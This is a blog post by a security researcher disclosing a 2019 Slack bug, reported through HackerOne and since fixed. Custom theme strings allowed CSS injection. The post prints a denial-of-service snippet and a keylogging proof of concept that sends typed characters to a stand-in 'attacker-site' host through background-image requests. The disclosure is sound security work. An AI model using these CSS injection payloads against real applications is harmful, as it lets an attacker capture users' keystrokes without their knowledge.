title: "Keylogging users via Slack themes"
keywords:
- slack
- vulnerability
- whitehat
- hackerone
tags:
- slack
- vulnerability
- whitehat
- hackerone
categories:
- security disclosures
thumbnailImage: https://images.fletchto99.com/blog/2019/november/slack-vulnerability/thumbnail.png
date: 2019/11/11
---

Back in August I found a [vulnerability in Slack](https://hackerone.com/reports/679969) which allowed me to keylog slack input via custom themes.

<!-- excerpt -->

{% image center clear https://images.fletchto99.com/blog/2019/november/slack-vulnerability/banner.png %}


Back in August I found a [vulnerability in Slack](https://hackerone.com/reports/679969) which allowed me to keylog slack input via custom themes. I came across this vulnerability when we were having some discussions in my work's slack regarding using CSS to change the font to `comic-sans`, as seen below:

{% codeblock lang:css %}
#FFFFFF;}*{FONT-FAMILY:"COMIC SANS MS"!IMPORTANT;}STYLE~DIV,DIV[TABINDEX="-1"]
{% endcodeblock %}

Neat right? However this is pretty harmless and likely wouldn't result in a bounty - maybe a `low` for no input sanitization. However, I was determined to find a way in which this could genuinely become dangerous. A co-worker, [d12](https://github.com/d12), pointed out that `#FFFFFF;} html {display:none;}` could be used to DoS the user's slack instance, which is certainly much worse than just changing fonts. It should be noted that once one slack instance was modified all other instances were also modified since the theme was persisted across clients (yes... I managed to lock myself out of multiple slack test instances).

However, my ultimate goal was data exfiltration... wouldn't it be great if we could see all the links to cat memes in the slack instance we're not a part of? This is the point in which I learned that CSS supports attribute selectors for [specific values](https://github.com/maxchehab/CSS-Keylogging/). More specifically that CSS allows you to determine the most recent value added to any type of input via the `[value$="<value>"]` selector. Furthermore, slack allows loading of external images. With this knowledge I present to you my very own custom slack theme:

{% codeblock lang:css %}
#FFFFFF;}INPUT[TYPE="TEXT"][VALUE$="A"] { BACKGROUND-IMAGE: URL("https://attacker-site/A"); },#350d36,#1264A3,#FFFFFF,#350D36,#FFFFFF,#2BAC76,#CD2553
{% endcodeblock %}

This theme is capable of determining when the user types the letter `A` into an `<input type="text">` on slack. When the user does this the CSS will load the background image `https://attacker-site/A` which can then be logged server side to indicate the user typed the letter A. This was as much of a PoC I needed to demo to slack that it was indeed possible to exfiltrate data provided the user actually applied the custom theme. Thankfully the 1-click custom theme option was not exploitable so it still required the user to copy/paste the theme which would certainly raise suspicions.

Here's the PoC video I sent slack of the request being logged locally. Note how I go into channels instead of typing a message, that's because the channel option used a text input while the message input was more complicated. I'm sure it would have been possible to write some CSS to select on the attributes there but this was enough to prove exfil was even possible.

{% video https://images.fletchto99.com/blog/2019/november/slack-vulnerability/poc.mov 100% PoC exploit video %}

Slack has kindly decided to disclose the vulnerability on [hackerone](https://hackerone.com/reports/679969).


## Reward

For finding this vulnerability slack awarded me $500. I'm using that money to match donations to my Movember campaign. If you'd like to learn more or donate click [here](https://mobro.co/fletchto99).

<!-- more -->
